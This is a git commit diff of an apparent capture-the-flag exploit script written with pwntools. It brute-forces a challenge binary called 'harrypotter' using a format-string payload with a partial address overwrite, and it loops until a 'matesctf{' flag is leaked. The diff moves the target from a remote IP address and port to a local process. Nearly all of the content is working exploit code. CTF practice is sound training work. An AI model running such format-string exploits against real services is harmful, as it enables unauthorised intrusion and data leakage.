117f3cd8ac5df8a7d16959ea69c08620e258b728
NOT <nguyenoanhthuong95@gmail.com>
2018-04-24 07:23:39 +0700

    Update harrypotter.py

--- harrypotter/harrypotter.py
+++ harrypotter/harrypotter.py
@@ -2,22 +2,20 @@ from pwn import *
 
 i = 0
 while True:
-	#r = process("./harrypotter")
-	r = remote("125.235.240.168",27017)
-	context.log_level = "critical"
 	print i
 	i += 1
-	payload = '%12$s'
-	payload = payload.ljust(0x30,'B')
-	payload += "\x70\x74"
-	r.recvuntil("It's time to cast your spell\n")
+	r = process("./harrypotter")
+	context.log_level = "critical"
+	payload = "%12$s"
+	payload = payload.ljust(0x30,"B")
+	payload += "\xf0\x35"	
+	r.recvuntil("spell\n")
 	r.send(payload)
 	try:
 		msg = r.recv()
-		#print msg
 		if "matesctf{" in msg and "matesctf{}" not in msg:
 			print msg
 			break
 		r.close()
 	except:
-		r.close()	
+		r.close()
